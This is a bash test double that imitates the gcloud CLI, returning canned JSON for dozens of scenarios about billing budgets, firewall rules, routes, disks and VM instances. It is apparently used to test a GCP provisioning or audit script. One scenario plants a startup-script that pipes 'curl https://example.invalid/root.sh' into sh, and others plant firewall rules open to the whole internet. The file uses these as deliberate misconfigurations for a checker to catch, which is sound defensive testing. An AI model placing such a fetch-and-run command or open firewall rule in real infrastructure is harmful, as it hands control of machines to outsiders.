#!/usr/bin/env bash
set -euo pipefail

: "${FAKE_GCLOUD_LOG:?FAKE_GCLOUD_LOG is required}"
: "${FAKE_GCLOUD_STATE_DIR:?FAKE_GCLOUD_STATE_DIR is required}"

scenario="${FAKE_GCLOUD_SCENARIO:-clean}"
project_id="sed-coamong"
zone="asia-northeast3-a"
for argument in "$@"; do
  case "$argument" in
    --project=*) project_id="${argument#--project=}" ;;
    --zone=*) zone="${argument#--zone=}" ;;
    --zones=*) zone="${argument#--zones=}" ;;
  esac
done

printf '%q ' "$@" >>"$FAKE_GCLOUD_LOG"
printf '\n' >>"$FAKE_GCLOUD_LOG"

exists() {
  [[ "$scenario" == "existing" \
    || "$scenario" == "extra-boot-user" \
    || "$scenario" == "extra-data-user" \
    || "$scenario" == "stopped-vm" \
    || "$scenario" == "readonly-boot" \
    || "$scenario" == "readonly-data" \
    || "$scenario" == "missing-nat-ip" \
    || "$scenario" == "wrong-instance-schedule" \
    || "$scenario" == "stopped-no-schedule" \
    || "$scenario" == "wrong-source-image" \
    || "$scenario" == "project-startup-metadata" \
    || "$scenario" == "inherited-firewall-policy" \
    || "$scenario" == "raw-firewall-policy" \
    || "$scenario" == "malformed-effective-wrapper" \
    || "$scenario" == "unknown-effective-wrapper" \
    || "$scenario" == "legacy-effective-firewalls" \
    || "$scenario" == "missing-default-route" \
    || "$scenario" == "custom-next-hop-route" \
    || "$scenario" == "wrong-default-route-type" \
    || "$scenario" == "wrong-subnet-route-type" \
    || "$scenario" == "egress-deny" \
    || "$scenario" == "effective-egress-deny" \
    || -f "$FAKE_GCLOUD_STATE_DIR/$1" ]]
}

write_marker() {
  : >"$FAKE_GCLOUD_STATE_DIR/$1"
}

if [[ "$1 $2" == "auth list" ]]; then
  if [[ "$scenario" == "unauthenticated" ]]; then
    printf '[]\n'
  else
    printf '[{"account":"operator@example.test","status":"ACTIVE"}]\n'
  fi
  exit 0
fi

if [[ "$1 $2" == "projects describe" ]]; then
  cat <<EOF
{"projectId":"$project_id","projectNumber":"123456789012","lifecycleState":"ACTIVE"}
EOF
  exit 0
fi

if [[ "$1 $2 $3" == "billing projects describe" ]]; then
  cat <<EOF
{"projectId":"$project_id","billingEnabled":true,"billingAccountName":"billingAccounts/000000-111111-222222"}
EOF
  exit 0
fi

if [[ "$1 $2 $3" == "billing budgets list" ]]; then
  if [[ "$scenario" == "bad-budget" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/bad","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350001"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "unscoped-budget" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/unscoped","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "filtered-budget" ]]; then
    cat <<'EOF'
[{
  "name":"billingAccounts/000000-111111-222222/budgets/filtered",
  "displayName":"moneyworry-90day",
  "amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},
  "budgetFilter":{"projects":["projects/123456789012"],"services":["services/6F81-5844-456A"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},
  "thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],
  "notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}
}]
EOF
  elif [[ "$scenario" == "monthly-budget" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/monthly","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","calendarPeriod":"MONTH"},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "wrong-budget-dates" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/dates","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":25},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "wrong-budget-thresholds" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/thresholds","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "forecast-budget-threshold" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/forecast","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95,"spendBasis":"FORECASTED_SPEND"}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  elif [[ "$scenario" == "no-budget-recipients" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/recipients","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":true,"enableProjectLevelRecipients":false}}]
EOF
  elif [[ "$scenario" == "wrong-credit-treatment" ]]; then
    cat <<'EOF'
[{"name":"billingAccounts/000000-111111-222222/budgets/credits","displayName":"moneyworry-90day","amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000"}},"budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"INCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},"thresholdRules":[{"thresholdPercent":0.25},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],"notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}}]
EOF
  else
    cat <<'EOF'
[{
  "name":"billingAccounts/000000-111111-222222/budgets/moneyworry-90day",
  "displayName":"moneyworry-90day",
  "amount":{"specifiedAmount":{"currencyCode":"KRW","units":"350000","nanos":0}},
  "budgetFilter":{"projects":["projects/123456789012"],"creditTypesTreatment":"EXCLUDE_ALL_CREDITS","customPeriod":{"startDate":{"year":2026,"month":8,"day":26},"endDate":{"year":2026,"month":11,"day":24}}},
  "thresholdRules":[{"thresholdPercent":0.25,"spendBasis":"CURRENT_SPEND"},{"thresholdPercent":0.5},{"thresholdPercent":0.7},{"thresholdPercent":0.85},{"thresholdPercent":0.95}],
  "notificationsRule":{"disableDefaultIamRecipients":false,"enableProjectLevelRecipients":true}
}]
EOF
  fi
  exit 0
fi

if [[ "$1 $2" == "services list" ]]; then
  if [[ "$scenario" == "missing-api" ]]; then
    cat <<'EOF'
[{"config":{"name":"compute.googleapis.com"},"state":"ENABLED"}]
EOF
  else
    cat <<'EOF'
[
 {"config":{"name":"billingbudgets.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"cloudbilling.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"cloudresourcemanager.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"compute.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"iap.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"logging.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"monitoring.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"networkconnectivity.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"oslogin.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"secretmanager.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"serviceusage.googleapis.com"},"state":"ENABLED"},
 {"config":{"name":"storage.googleapis.com"},"state":"ENABLED"}
]
EOF
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute project-info describe" ]]; then
  if [[ "$scenario" == "project-startup-metadata" ]]; then
    cat <<'EOF'
{"commonInstanceMetadata":{"items":[{"key":"startup-script","value":"#!/bin/sh\ncurl https://example.invalid/root.sh | sh"}]}}
EOF
  else
    printf '{"commonInstanceMetadata":{"items":[]}}\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute images describe" ]]; then
  image_status='READY'
  image_architecture='X86_64'
  image_deprecated=''
  image_license='ubuntu-2404-lts'
  image_name='ubuntu-2404-noble-amd64-v20260820'
  [[ "$scenario" != "missing-image" ]] || image_name=''
  [[ "$scenario" != "bad-image-status" ]] || image_status='FAILED'
  [[ "$scenario" != "deprecated-image" ]] \
    || image_deprecated=',"deprecated":{"state":"DEPRECATED","replacement":"projects/ubuntu-os-cloud/global/images/replacement"}'
  [[ "$scenario" != "arm-image" ]] || image_architecture='ARM64'
  [[ "$scenario" != "wrong-image-license" ]] || image_license='ubuntu-pro-2404-lts'
  cat <<EOF
{"name":"$image_name","status":"$image_status","architecture":"$image_architecture","sourceType":"RAW","family":"ubuntu-2404-lts-amd64","selfLink":"https://www.googleapis.com/compute/v1/projects/ubuntu-os-cloud/global/images/ubuntu-2404-noble-amd64-v20260820","licenses":["https://www.googleapis.com/compute/v1/projects/ubuntu-os-cloud/global/licenses/$image_license"],"guestOsFeatures":[{"type":"UEFI_COMPATIBLE"},{"type":"VIRTIO_SCSI_MULTIQUEUE"}]$image_deprecated}
EOF
  exit 0
fi

if [[ "$1 $2 $3" == "compute resource-policies list" ]]; then
  schedule_status='READY'
  start_cron='0 7 * * *'
  stop_cron='0 1 * * *'
  timezone='Asia/Seoul'
  initiation='2026-08-26T15:00:00.000Z'
  expiration='2026-11-23T17:00:00.000Z'
  [[ "$scenario" != "schedule-drift" ]] || start_cron='0 8 * * *'
  [[ "$scenario" != "schedule-not-ready" ]] || schedule_status='CREATING'
  [[ "$scenario" != "schedule-expiration-drift" ]] \
    || expiration='2026-11-24T17:00:00.000Z'
  if [[ "$scenario" == "schedule-drift" \
    || "$scenario" == "schedule-not-ready" \
    || "$scenario" == "schedule-expiration-drift" ]] \
    || { exists schedule && [[ "$scenario" != "stopped-no-schedule" ]]; }; then
    cat <<EOF
[{
  "name":"moneyworry-18h-daily",
  "region":"https://www.googleapis.com/compute/v1/projects/$project_id/regions/asia-northeast3",
  "status":"$schedule_status",
  "instanceSchedulePolicy":{
    "vmStartSchedule":{"schedule":"$start_cron"},
    "vmStopSchedule":{"schedule":"$stop_cron"},
    "timeZone":"$timezone",
    "startTime":"$initiation",
    "expirationTime":"$expiration"
  }
}]
EOF
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute network-firewall-policies get-effective-firewalls" ]]; then
  iap_legacy='{"type":"network-firewall","name":"moneyworry-iap-ssh","direction":"INGRESS","action":"ALLOW","disabled":false,"ip_ranges":["35.235.240.0/20"],"target_tags":["moneyworry-iap"]}'
  inherited_legacy='{"type":"org-firewall","firewall_policy_name":"organizations/123/firewallPolicies/456","direction":"INGRESS","action":"ALLOW","disabled":false,"ip_ranges":["0.0.0.0/0"]}'
  iap_raw='{"allowed":[{"IPProtocol":"tcp","ports":["22"]}],"creationTimestamp":"2026-08-26T04:00:00.000+09:00","description":"","direction":"INGRESS","disabled":false,"id":"123456789","kind":"compute#firewall","logConfig":{"enable":true},"name":"moneyworry-iap-ssh","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","priority":1000,"selfLink":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/firewalls/moneyworry-iap-ssh","sourceRanges":["35.235.240.0/20"],"targetTags":["moneyworry-iap"]}'
  egress_raw='{"denied":[{"IPProtocol":"tcp","ports":["443"]}],"direction":"EGRESS","disabled":false,"destinationRanges":["0.0.0.0/0"],"logConfig":{"enable":true},"name":"deny-https-effective","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","priority":900,"targetTags":["moneyworry-iap"]}'
  policy_raw='{"displayName":"organization-policy","name":"organizations/123456789/firewallPolicies/456789012","priority":0,"rules":[{"action":"allow","direction":"INGRESS","priority":1000}],"type":"HIERARCHY"}'
  if [[ "$scenario" == "inherited-firewall-policy" ]]; then
    printf '[%s,%s]\n' "$iap_legacy" "$inherited_legacy"
  elif [[ "$scenario" == "legacy-effective-firewalls" ]]; then
    printf '[%s]\n' "$iap_legacy"
  elif [[ "$scenario" == "raw-firewall-policy" ]]; then
    printf '{"firewallPolicys":[%s],"firewalls":[%s]}\n' "$policy_raw" "$iap_raw"
  elif [[ "$scenario" == "malformed-effective-wrapper" ]]; then
    printf '{"firewallPolicys":[],"firewalls":{}}\n'
  elif [[ "$scenario" == "unknown-effective-wrapper" ]]; then
    printf '{"firewallPolicys":[],"firewalls":[%s],"organizationFirewalls":[]}\n' "$iap_raw"
  elif [[ "$scenario" == "effective-egress-deny" ]]; then
    printf '{"firewallPolicys":[],"firewalls":[%s,%s]}\n' "$iap_raw" "$egress_raw"
  elif exists firewall; then
    printf '{"firewallPolicys":[],"firewalls":[%s]}\n' "$iap_raw"
  else
    printf '{"firewallPolicys":[],"firewalls":[]}\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3 $4" == "compute networks subnets list" ]]; then
  if exists subnet; then
    cat <<EOF
[{"name":"moneyworry-seoul","region":"https://www.googleapis.com/compute/v1/projects/$project_id/regions/asia-northeast3","network":"https://www.googleapis.com/compute/v1/projects/$project_id/global/networks/moneyworry-vpc","ipCidrRange":"10.20.0.0/24","privateIpGoogleAccess":true,"stackType":"IPV4_ONLY"}]
EOF
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute networks list" ]]; then
  if [[ "$scenario" == "drift" ]]; then
    cat <<EOF
[{"name":"moneyworry-vpc","autoCreateSubnetworks":false,"mtu":1500,"routingConfig":{"routingMode":"REGIONAL"}}]
EOF
  elif exists network; then
    cat <<EOF
[{"name":"moneyworry-vpc","autoCreateSubnetworks":false,"mtu":1460,"routingConfig":{"routingMode":"REGIONAL"}}]
EOF
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute routes list" ]]; then
  default_route='{"name":"default-route-internet","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destRange":"0.0.0.0/0","priority":1000,"nextHopGateway":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/gateways/default-internet-gateway"}'
  subnet_route='{"name":"default-route-subnet","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destRange":"10.20.0.0/24","priority":0,"nextHopNetwork":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc"}'
  wrong_default_type='{"name":"default-route-internet","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destRange":"0.0.0.0/0","priority":1000,"nextHopGateway":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/gateways/default-internet-gateway","routeType":"DYNAMIC"}'
  wrong_subnet_type='{"name":"default-route-subnet","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destRange":"10.20.0.0/24","priority":0,"nextHopNetwork":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","routeType":"STATIC"}'
  custom_route='{"name":"unexpected-next-hop","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destRange":"0.0.0.0/1","priority":900,"nextHopInstance":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/router-vm","routeType":"STATIC","routeStatus":"ACTIVE"}'
  if exists network; then
    if [[ "$scenario" == "missing-default-route" ]]; then
      printf '[%s]\n' "$subnet_route"
    elif [[ "$scenario" == "custom-next-hop-route" ]]; then
      printf '[%s,%s,%s]\n' "$default_route" "$subnet_route" "$custom_route"
    elif [[ "$scenario" == "wrong-default-route-type" ]]; then
      printf '[%s,%s]\n' "$wrong_default_type" "$subnet_route"
    elif [[ "$scenario" == "wrong-subnet-route-type" ]]; then
      printf '[%s,%s]\n' "$default_route" "$wrong_subnet_type"
    elif exists subnet; then
      printf '[%s,%s]\n' "$default_route" "$subnet_route"
    else
      printf '[%s]\n' "$default_route"
    fi
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute routers list" ]]; then
  if [[ "$scenario" == "target-cloud-router" ]]; then
    printf '[{"name":"unexpected-router","network":"https://www.googleapis.com/compute/v1/projects/%s/global/networks/moneyworry-vpc","region":"https://www.googleapis.com/compute/v1/projects/%s/regions/asia-northeast3"}]\n' "$project_id" "$project_id"
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "network-connectivity policy-based-routes list" ]]; then
  if [[ "$scenario" == "target-policy-based-route" ]]; then
    printf '[{"name":"projects/%s/locations/global/policyBasedRoutes/unexpected-pbr","network":"projects/%s/global/networks/moneyworry-vpc","priority":1}]\n' "$project_id" "$project_id"
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "network-connectivity spokes list" ]]; then
  if [[ "$scenario" == "target-ncc-spoke" ]]; then
    printf '[{"name":"projects/%s/locations/global/spokes/unexpected-spoke","linkedVpcNetwork":{"uri":"projects/%s/global/networks/moneyworry-vpc"},"state":"ACTIVE"}]\n' "$project_id" "$project_id"
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute firewall-rules list" ]]; then
  iap='{"name":"moneyworry-iap-ssh","disabled":false,"direction":"INGRESS","priority":1000,"network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","sourceRanges":["35.235.240.0/20"],"targetTags":["moneyworry-iap"],"allowed":[{"IPProtocol":"tcp","ports":["22"]}],"logConfig":{"enable":true}}'
  broad='{"name":"danger-public","disabled":false,"direction":"INGRESS","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/default","sourceRanges":["0.0.0.0/0"],"allowed":[{"IPProtocol":"tcp","ports":["22","5433"]}]}'
  split_public='{"name":"split-public","disabled":false,"direction":"INGRESS","network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","sourceRanges":["0.0.0.0/1","128.0.0.0/1"],"targetTags":["moneyworry-iap"],"allowed":[{"IPProtocol":"tcp","ports":["9999"]}]}'
  egress_deny='{"name":"deny-https","disabled":false,"direction":"EGRESS","priority":900,"network":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/global/networks/moneyworry-vpc","destinationRanges":["0.0.0.0/0"],"targetTags":["moneyworry-iap"],"denied":[{"IPProtocol":"tcp","ports":["443"]}]}'
  if [[ "$scenario" == "broad-firewall" ]] && exists firewall; then
    printf '[%s,%s]\n' "$iap" "$broad"
  elif [[ "$scenario" == "broad-firewall" ]]; then
    printf '[%s]\n' "$broad"
  elif [[ "$scenario" == "broad-after-firewall-create" ]] && exists firewall; then
    printf '[%s,%s]\n' "$iap" "$broad"
  elif [[ "$scenario" == "split-public-ingress" ]]; then
    printf '[%s]\n' "$split_public"
  elif [[ "$scenario" == "egress-deny" ]]; then
    printf '[%s,%s]\n' "$iap" "$egress_deny"
  elif exists firewall; then
    printf '[%s]\n' "$iap"
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute disks list" ]]; then
  has_boot=0
  has_data=0
  exists instance && has_boot=1
  exists data_disk && has_data=1
  if [[ "$scenario" == "extra-boot-user" ]]; then
    boot_users='["https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/moneyworry-demo","https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/unexpected-vm"]'
  else
    boot_users='["https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/moneyworry-demo"]'
  fi
  source_image='ubuntu-2404-noble-amd64-v20260820'
  [[ "$scenario" != "wrong-source-image" ]] || source_image='ubuntu-2404-noble-amd64-v20260813'
  boot='{"name":"moneyworry-demo","zone":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'","sizeGb":"30","type":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/diskTypes/pd-standard","sourceImage":"https://www.googleapis.com/compute/v1/projects/ubuntu-os-cloud/global/images/'"$source_image"'","licenses":["https://www.googleapis.com/compute/v1/projects/ubuntu-os-cloud/global/licenses/ubuntu-2404-lts"],"users":'"$boot_users"'}'
  if (( has_boot == 1 )); then
    if [[ "$scenario" == "extra-data-user" ]]; then
      data_users='["https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/moneyworry-demo","https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/unexpected-vm"]'
    else
      data_users='["https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/instances/moneyworry-demo"]'
    fi
  else
    data_users='[]'
  fi
  data='{"name":"moneyworry-data","zone":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'","sizeGb":"80","type":"https://www.googleapis.com/compute/v1/projects/'"$project_id"'/zones/'"$zone"'/diskTypes/pd-balanced","users":'"$data_users"'}'
  if (( has_boot == 1 && has_data == 1 )); then
    printf '[%s,%s]\n' "$boot" "$data"
  elif (( has_boot == 1 )); then
    printf '[%s]\n' "$boot"
  elif (( has_data == 1 )); then
    printf '[%s]\n' "$data"
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3" == "compute instances list" ]]; then
  if exists instance; then
    vm_status='RUNNING'
    boot_mode='READ_WRITE'
    data_mode='READ_WRITE'
    nat_ip='34.64.0.10'
    instance_schedule='moneyworry-18h-daily'
    if [[ "$scenario" == "stopped-vm" || "$scenario" == "stopped-no-schedule" ]]; then
      vm_status='TERMINATED'
      nat_ip=''
    fi
    [[ "$scenario" != "wrong-instance-schedule" ]] || instance_schedule='unexpected-schedule'
    [[ "$scenario" != "readonly-boot" ]] || boot_mode='READ_ONLY'
    [[ "$scenario" != "readonly-data" ]] || data_mode='READ_ONLY'
    [[ "$scenario" != "missing-nat-ip" ]] || nat_ip=''
    cat <<EOF
[
 {
  "name":"moneyworry-demo",
  "status":"$vm_status",
  "zone":"https://www.googleapis.com/compute/v1/projects/$project_id/zones/$zone",
  "machineType":"https://www.googleapis.com/compute/v1/projects/$project_id/zones/$zone/machineTypes/e2-custom-2-12288",
  "deletionProtection":true,
  "canIpForward":false,
  "resourcePolicies":["https://www.googleapis.com/compute/v1/projects/$project_id/regions/asia-northeast3/resourcePolicies/$instance_schedule"],
  "tags":{"items":["moneyworry-iap"]},
  "metadata":{"items":[
    {"key":"block-project-ssh-keys","value":"TRUE"},
    {"key":"enable-oslogin","value":"TRUE"},
    {"key":"enable-oslogin-2fa","value":"TRUE"}
  ]},
  "serviceAccounts":[],
  "shieldedInstanceConfig":{"enableSecureBoot":true,"enableVtpm":true,"enableIntegrityMonitoring":true},
  "scheduling":{"provisioningModel":"STANDARD","onHostMaintenance":"MIGRATE","automaticRestart":true,"preemptible":false},
  "networkInterfaces":[{
    "network":"https://www.googleapis.com/compute/v1/projects/$project_id/global/networks/moneyworry-vpc",
    "subnetwork":"https://www.googleapis.com/compute/v1/projects/$project_id/regions/asia-northeast3/subnetworks/moneyworry-seoul",
    "accessConfigs":[{"type":"ONE_TO_ONE_NAT","networkTier":"PREMIUM","natIP":"$nat_ip"}]
  }],
  "disks":[
    {"source":"https://www.googleapis.com/compute/v1/projects/$project_id/zones/$zone/disks/moneyworry-demo","deviceName":"moneyworry-boot","boot":true,"autoDelete":true,"mode":"$boot_mode"},
    {"source":"https://www.googleapis.com/compute/v1/projects/$project_id/zones/$zone/disks/moneyworry-data","deviceName":"moneyworry-data","boot":false,"autoDelete":false,"mode":"$data_mode"}
  ]
 }
]
EOF
  else
    printf '[]\n'
  fi
  exit 0
fi

if [[ "$1 $2 $3 $4" == "compute networks subnets create" ]]; then
  write_marker subnet
  printf '{}\n'
  exit 0
fi

if [[ "$1 $2 $3" == "compute networks create" ]]; then
  write_marker network
  printf '{}\n'
  exit 0
fi

if [[ "$1 $2 $3" == "compute firewall-rules create" ]]; then
  write_marker firewall
  printf '{}\n'
  exit 0
fi

if [[ "$1 $2 $3 $4" == "compute resource-policies create instance-schedule" ]]; then
  write_marker schedule
  printf '{}\n'
  exit 0
fi

if [[ "$1 $2 $3" == "compute disks create" ]]; then
  write_marker data_disk
  printf '{}\n'
  exit 0
fi

if [[ "$1 $2 $3" == "compute instances create" ]]; then
  write_marker instance
  printf '{}\n'
  exit 0
fi

printf 'fake-gcloud: unsupported invocation:' >&2
printf ' %q' "$@" >&2
printf '\n' >&2
exit 99
